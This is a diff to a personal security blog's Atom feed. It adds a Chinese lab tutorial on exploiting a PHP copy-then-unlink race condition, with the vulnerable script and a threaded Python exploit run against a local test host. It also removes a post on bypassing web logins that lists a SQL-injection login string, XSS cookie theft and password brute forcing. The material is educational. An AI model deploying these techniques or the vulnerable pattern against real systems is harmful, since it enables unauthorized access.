@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://Ernket.github.io/"/>
-  <updated>2018-12-11T10:42:29.706Z</updated>
+  <updated>2018-12-22T15:01:32.531Z</updated>
   <id>https://Ernket.github.io/</id>
   
   <author>
@@ -15,6 +15,28 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title></title>
+    <link href="https://Ernket.github.io/2018/12/22/Web%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E5%88%A9%E7%94%A8/"/>
+    <id>https://Ernket.github.io/2018/12/22/Web条件竞争利用/</id>
+    <published>2018-12-22T15:01:50.504Z</published>
+    <updated>2018-12-22T15:01:32.531Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="类似前言一样的东西"><a href="#类似前言一样的东西" class="headerlink" title="类似前言一样的东西"></a>类似前言一样的东西</h1><p>条件竞争是真的好玩，佛了</p><p>#解释<br>先上例子<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">print</span>(<span class="string">"Hello,This is test server"</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'src'</span>]))&#123;</span></span><br><span class="line"><span class="php">copy($_GET[<span class="string">'src'</span>],$_GET[<span class="string">'dst'</span>]);</span></span><br><span class="line"><span class="php">unlink($_GET[<span class="string">'dst'</span>]);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">print</span>(<span class="string">"Error!"</span>);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p><p>这是典型的条件竞争利用的点，正常的服务器操作，是copy参数src的文件名和参数dst的文件名，复制完毕后，立马unlink删除，那么条件竞争呢，就是利用复制完毕，卡还没来得及删除的时间点，访问文件，执行恶意代码，而恶意代码已经执行完成了，那么文件删不删除都不重要了，具体的流程如下图<br><img src="http://t1.aixinxi.net/o_1cvb5umk7lo14bt1ibc1bb1tn5a.jpg-j.jpg" alt=""><br>一目了然，小天才说的就是我吧</p><p>#环境搭建</p><ul><li>靶机: CentOS6.5</li><li>PHP</li></ul><p>首先现在靶机安装httpd服务，再安装php<br>完成后，开始配置环境<br><img src="http://t1.aixinxi.net/o_1cvb66l211rls7nf54ig7kbm6a.png-j.jpg" alt=""><br>Elapse.php和file.php的内容为<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Elapse.php:</span><br><span class="line"></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">print</span>(<span class="string">"Hello,This is test server"</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'src'</span>]))&#123;</span></span><br><span class="line"><span class="php">copy($_GET[<span class="string">'src'</span>],$_GET[<span class="string">'dst'</span>]);</span></span><br><span class="line"><span class="php">unlink($_GET[<span class="string">'dst'</span>]);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">print</span>(<span class="string">"Error!"</span>);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line">-----------优秀的分割线-----------</span><br><span class="line"></span><br><span class="line">file.php:</span><br><span class="line"></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$myfile = fopen(<span class="string">"test.txt"</span>,<span class="string">"w"</span>);</span></span><br><span class="line"><span class="php">$txt = <span class="string">"ElapseNB\n"</span>;</span></span><br><span class="line"><span class="php">fwrite($myfile,$txt);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p><p>具体利用方式就是，通过访问Elapse.php，传入参数将file.php copy出来然后同时访问新文件<br>这里用的是python3多线程<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url1 = <span class="string">'http://192.168.1.111/Elapse.php?src=file.php&amp;dst=myfile.php'</span></span><br><span class="line">url2 = <span class="string">'http://192.168.1.111/myfile.php'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">filecreate</span><span class="params">(url)</span>:</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">requests.get(url)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">print(<span class="string">"not find file"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">threads = []</span><br><span class="line"><span class="keyword">for</span> e <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">t1 = threading.Thread(target=filecreate,args=(url1,))</span><br><span class="line">t2 = threading.Thread(target=filecreate,args=(url2,))</span><br><span class="line">threads.append(t1)</span><br><span class="line">threads.append(t2)</span><br><span class="line">t1.start()</span><br><span class="line">t2.start()</span><br><span class="line">print(<span class="string">"Successful!"</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure></p><p>创建两个线程，同时访问两个url<br>运行结果:<br><img src="http://t1.aixinxi.net/o_1cvb6q0s01usu1al81dvk1qippfja.png-j.jpg" alt=""></p><p><img src="http://t1.aixinxi.net/o_1cvb6oisfcnr10kukkd1q9fv95a.png-j.jpg" alt=""><br>在服务器种可以看到多出来了一个文件，内容为ElapseNB</p><p>(小天才说的就是我8)<br>带哥们觉得代码有用不妨打个赏吧，都是纯手敲的呀，不是百度复制来的，小elapse没钱吃肉包了: )</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;类似前言一样的东西&quot;&gt;&lt;a href=&quot;#类似前言一样的东西&quot; class=&quot;headerlink&quot; title=&quot;类似前言一样的东西&quot;&gt;&lt;/a&gt;类似前言一样的东西&lt;/h1&gt;&lt;p&gt;条件竞争是真的好玩，佛了&lt;/p&gt;
+&lt;p&gt;#解释&lt;br&gt;先上例子&lt;br&gt;&lt;figure
+      
+    
+    </summary>
+    
+    
+  </entry>
   
   <entry>
     <title>Python3栅栏密码解密</title>
@@ -298,9 +320,9 @@
       <category term="网络安全" scheme="https://Ernket.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
     
     
-      <category term="网络安全" scheme="https://Ernket.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
-    
       <category term="linux" scheme="https://Ernket.github.io/tags/linux/"/>
+    
+      <category term="网络安全" scheme="https://Ernket.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
     
   </entry>
   
@@ -322,9 +344,9 @@
       <category term="网络安全" scheme="https://Ernket.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
     
     
-      <category term="网络安全" scheme="https://Ernket.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
-    
       <category term="linux" scheme="https://Ernket.github.io/tags/linux/"/>
+    
+      <category term="网络安全" scheme="https://Ernket.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
     
   </entry>
   
@@ -390,9 +412,9 @@
       <category term="网络安全" scheme="https://Ernket.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
     
     
-      <category term="网络安全" scheme="https://Ernket.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
-    
       <category term="linux" scheme="https://Ernket.github.io/tags/linux/"/>
+    
+      <category term="网络安全" scheme="https://Ernket.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
     
   </entry>
   
@@ -439,28 +461,6 @@
       <category term="windows" scheme="https://Ernket.github.io/tags/windows/"/>
     
       <category term="逆向破解" scheme="https://Ernket.github.io/tags/%E9%80%86%E5%90%91%E7%A0%B4%E8%A7%A3/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>突破web系统登录（一）</title>
-    <link href="https://Ernket.github.io/2018/02/27/%E7%AA%81%E7%A0%B4WEB%E7%99%BB%E9%99%86/"/>
-    <id>https://Ernket.github.io/2018/02/27/突破WEB登陆/</id>
-    <published>2018-02-27T00:34:13.000Z</published>
-    <updated>2018-04-10T09:13:55.196Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="突破web系统登录（一）"><a href="#突破web系统登录（一）" class="headerlink" title="突破web系统登录（一）"></a>突破web系统登录（一）</h1><p>在WEB渗透时，我们通常都会遇到一些需要登录进去才能进一步做测试的系统，但是又碍于没有密码或者用户名，那么下面就简单介绍一些方法</p><h3 id="登录绕过"><a href="#登录绕过" class="headerlink" title="登录绕过"></a>登录绕过</h3><ul><li>登录绕过，无疑是最轻松，最省时间的方法了，目前的主要方法有:<br>1.SQL万能密码登录，语句：admin’ or ‘1’=’1’ –<br>2.XSS获取别的用户的Cookie后，替换登录系统<br>3.通过爆破目录、Google Hacking、目录文件扫描等方法，找到没有授权、做防护的页面，直接进行绕过<br>4.通过别人留下来的后门文件或这默认的管理员密码等，直接登录<h3 id="密码爆破"><a href="#密码爆破" class="headerlink" title="密码爆破"></a>密码爆破</h3></li><li>除去登录绕过，还可以尝试用工具进行爆破，但是猜解一个用户的管理员密码则需要成千上万条密码来尝试。<br>1.用BurpSuite进行密码爆破<br>2.利用Python脚本进行爆破，例如htpwdScan(<a href="https://github.com/lijiejie/htpwdScan" target="_blank" rel="noopener">https://github.com/lijiejie/htpwdScan</a>)<br>3.利用一些网上别人整理好的密码字典进行爆破，也可做到高效。例如一些TOP500、TOP1000(<a href="https://github.com/LandGrey/pydictor/blob/master/wordlist/SEDB/ChineseWeakPass1000.txt)，以及TOP1W(https://github.com/danielmiessler/SecLists/tree/master/Passwords" target="_blank" rel="noopener">https://github.com/LandGrey/pydictor/blob/master/wordlist/SEDB/ChineseWeakPass1000.txt)，以及TOP1W(https://github.com/danielmiessler/SecLists/tree/master/Passwords</a>)<br>4.如果还是没有猜解成功的话，那可以根据对方的信息（例如邮箱、姓名、生日）等构造一个字典进行爆破（kali工具推荐cupp，安装命令apt-get install cupp,github链接:<a href="https://github.com/Mebus/cupp）" target="_blank" rel="noopener">https://github.com/Mebus/cupp）</a></li></ul>]]></content>
-    
-    <summary type="html">
-    
-      在WEB渗透时，我们通常都会遇到一些需要登录进去才能进一步做测试的系统，但是又碍于没有密码或者用户名，那么下面就简单介绍一些方法
-    
-    </summary>
-    
-      <category term="网络安全" scheme="https://Ernket.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
-    
-    
-      <category term="网络安全" scheme="https://Ernket.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
     
   </entry>
   
